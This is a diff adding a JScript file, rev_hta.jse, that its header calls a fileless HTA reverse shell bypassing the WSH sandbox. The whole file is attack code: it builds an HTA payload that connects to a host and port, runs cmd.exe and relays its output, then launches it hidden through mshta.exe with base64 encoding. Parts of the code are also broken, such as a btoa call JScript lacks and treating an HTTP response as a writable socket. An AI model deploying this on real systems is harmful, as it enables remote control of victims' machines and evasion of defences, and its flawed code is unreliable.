@@ -1,0 +1,52 @@
+// rev_hta.jse - Fileless HTA reverse shell (bypasses WSH sandbox)
+(function () {
+    var host = "127.0.0.1";
+    var port = 8080;
+
+    var htaCode = 
+    "<html><body><script language=\"JScript\">\n" +
+    "var s = new ActiveXObject('MSXML2.XMLHTTP');\n" +
+    "s.open('GET', 'http://" + host + ":" + port + "/', false);\n" +
+    "s.send();\n" +
+    "var shell = new ActiveXObject('WScript.Shell');\n" +
+    "var proc = shell.Exec('cmd.exe');\n" +
+    "var socket = s.responseStream;\n" +
+    "setInterval(function(){\n" +
+    "  try {\n" +
+    "    while (proc.StdOut.AtEndOfStream == false) {\n" +
+    "      socket.Write(proc.StdOut.ReadAll());\n" +
+    "    }\n" +
+    "    while (proc.StdErr.AtEndOfStream == false) {\n" +
+    "      socket.Write(proc.StdErr.ReadAll());\n" +
+    "    }\n" +
+    "    if (socket.readystate == 4) {\n" +
+    "      proc.StdIn.Write(s.responseText);\n" +
+    "      s.responseText = '';\n" +
+    "    }\n" +
+    "  } catch(e) {}\n" +
+    "}, 100);\n" +
+    "</script></body></html>";
+
+    var b64 = btoa(htaCode);  // JScript has no btoa → use workaround
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Run("mshta.exe \"javascript:(function(){var d=document.open();d.write(atob('" + encodeBase64(htaCode) + "'));d.close()})()\"", 0, false);
+})();
+
+// --- Base64 encode (JScript workaround) ---
+function encodeBase64(str) {
+    var xml = new ActiveXObject("MSXML2.DOMDocument");
+    var elem = xml.createElement("base64");
+    elem.dataType = "bin.base64";
+    elem.nodeTypedValue = streamFromString(str);
+    return elem.text;
+}
+function streamFromString(str) {
+    var stm = new ActiveXObject("ADODB.Stream");
+    stm.Type = 2; // text
+    stm.Charset = "utf-8";
+    stm.Open();
+    stm.WriteText(str);
+    stm.Position = 0;
+    stm.Type = 1; // binary
+    return stm.Read();
+}
